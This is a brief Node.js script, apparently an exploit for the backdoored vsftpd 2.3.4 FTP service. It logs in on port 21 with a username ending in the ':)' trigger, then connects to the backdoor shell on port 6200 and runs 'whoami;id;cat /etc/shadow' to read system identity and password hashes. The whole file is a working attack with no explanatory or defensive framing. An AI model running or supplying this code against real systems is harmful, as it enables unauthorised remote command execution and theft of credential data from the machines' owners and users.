const net = require('net');

const server_ip = '192.168.31.129';

const options = {
    host: server_ip,
    port: 21
}

const backdoor = {
    host: server_ip,
    port: 6200
}

var username = Buffer.from("USER ThePenClicker:)", "ascii");
var password = Buffer.from("PASS password", "ascii");
var command  = Buffer.from('whoami;id;cat /etc/shadow', 'ascii')

const client = net.createConnection(options, () => {
    client.write(username + '\n');
    client.write(password + '\n');
});

client.on('data', (data) => {
    console.log(data.toString());
    client.end();
    backdoorConnect();
});

function backdoorConnect() {
    const backdoorClient = net.createConnection(backdoor, () => {
        backdoorClient.write(command + '\n');
    });

    backdoorClient.on('data', (data) => {
        console.log(data.toString());
        client.end();
    });
}